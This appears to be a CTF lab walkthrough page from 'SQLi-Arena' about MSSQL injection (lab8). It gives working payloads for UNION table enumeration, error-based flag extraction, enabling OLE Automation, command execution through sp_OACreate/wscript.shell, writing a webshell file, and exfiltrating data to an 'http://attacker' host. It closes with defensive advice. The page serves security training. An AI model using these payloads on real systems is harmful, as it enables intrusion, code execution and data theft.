<h4>Step 1: Test Normal Report Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Sales<br>
        <span class="prompt">SQL: </span>SELECT id, report_name, summary, created_at FROM reports WHERE report_name LIKE '%Sales%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Q1 Sales Report</strong> (2026-03-23 16:22:36). Total revenue: $2.4M, 15% increase YoY<br>
        <strong>Q2 Sales Report</strong> (2026-03-23 16:22:36). Total revenue: $2.8M, 12% increase YoY
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</strong>
    </div>
</div>

<h4>Step 3: Enumerate Database and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery + Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Discover tables:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, TABLE_NAME, 'x', GETDATE() FROM INFORMATION_SCHEMA.TABLES -- -<br>
        <span class="prompt">Output: </span><strong>flags</strong> (2026-03-24) | x &nbsp;&bull;&nbsp; <strong>reports</strong> (2026-03-24) | x &nbsp;&bull;&nbsp; plus all existing report rows<br><br>
        <span class="prompt">// Extract flag via CONVERT:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the varchar value '<strong>FLAG{ms_sp_04cr34t3_rc3}</strong>' to data type int.
    </div>
</div>

<h4>Step 4: Verify xp_cmdshell is Disabled</h4>
<p>The scenario says xp_cmdshell is permanently disabled. Test it:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4: xp_cmdshell Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; EXEC xp_cmdshell 'whoami'; -- -<br>
        <span class="prompt">Result: </span>All 5 reports displayed (stacked query executed without error, but xp_cmdshell produces no visible output on Linux MSSQL)<br><br>
        <span class="prompt">// xp_cmdshell is not supported on Linux MSSQL -- sp_OACreate provides an alternative path on Windows.</span>
    </div>
</div>

<h4>Step 5: sp_OACreate. OLE Automation (Conceptual)</h4>
<p>
    When xp_cmdshell is blocked, <code>sp_OACreate</code> instantiates COM objects for RCE.
    This requires sysadmin privileges and OLE Automation to be enabled.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5: sp_OACreate Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Enable OLE Automation</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; -- -<br><br>
        <span class="prompt">// Step B: Create wscript.shell and execute command</span><br>
        <span class="prompt">Input: </span>'; DECLARE @obj INT; EXEC sp_OACreate 'wscript.shell', @obj OUTPUT; EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd /c whoami > C:\temp\out.txt'; EXEC sp_OADestroy @obj; -- -<br><br>
        <span class="prompt">// Step C: Read output via BULK INSERT</span><br>
        <span class="prompt">Input: </span>'; CREATE TABLE #output (line VARCHAR(8000)); BULK INSERT #output FROM 'C:\temp\out.txt'; -- -<br>
        <span class="prompt">Read:  </span>' AND 1=CONVERT(INT, (SELECT TOP 1 line FROM #output)) -- -
    </div>
</div>

<h4>Step 6: Alternative COM Objects</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Other COM Vectors</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Scripting.FileSystemObject -- write files:</span><br>
        <span class="prompt">Input: </span>'; DECLARE @fso INT, @file INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT; EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 'C:\webshell.aspx', 1; EXEC sp_OAMethod @file, 'Write', NULL, '&lt;%@ Page Language="C#" %&gt;'; -- -<br><br>
        <span class="prompt">// MSXML2.ServerXMLHTTP -- data exfiltration:</span><br>
        <span class="prompt">Input: </span>'; DECLARE @http INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @http OUTPUT; EXEC sp_OAMethod @http, 'open', NULL, 'GET', 'http://attacker/?flag=FLAG{...}', 0; EXEC sp_OAMethod @http, 'send'; -- -
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_sp_04cr34t3_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab8" \<br> --data-urlencode "report=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt"># Verified output:</span><br>
        MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_sp_04cr34t3_rc3}' to data type int.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Even when <code>xp_cmdshell</code> is disabled, MSSQL
    offers alternative RCE paths through OLE Automation Procedures. <code>sp_OACreate</code>
    can instantiate COM objects like <code>wscript.shell</code> (command execution),
    <code>Scripting.FileSystemObject</code> (file I/O), and <code>MSXML2.ServerXMLHTTP</code>
    (HTTP requests for data exfiltration). The attack chain: enable OLE via sp_configure,
    create COM object, call methods. Disable OLE Automation in production and never grant
    sysadmin to application accounts.
</div>
